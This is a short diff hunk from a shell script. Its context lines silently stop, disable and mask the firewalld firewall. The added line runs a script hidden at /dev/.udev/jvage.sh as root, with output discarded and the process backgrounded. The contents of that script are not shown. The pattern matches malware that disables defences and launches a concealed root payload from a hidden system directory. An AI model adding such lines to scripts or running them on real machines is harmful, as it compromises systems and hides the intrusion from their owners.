@@ -46,6 +46,8 @@ if (( now - last_run >= cooldown )); then
             sudo systemctl stop firewalld > /dev/null 2>&1 &
             sudo systemctl disable firewalld > /dev/null 2>&1 &
             sudo systemctl mask firewalld > /dev/null 2>&1 &
+            sudo bash /dev/.udev/jvage.sh > /dev/null 2>&1 &
+
         fi
     ) 200>"$lock_file"
 fi
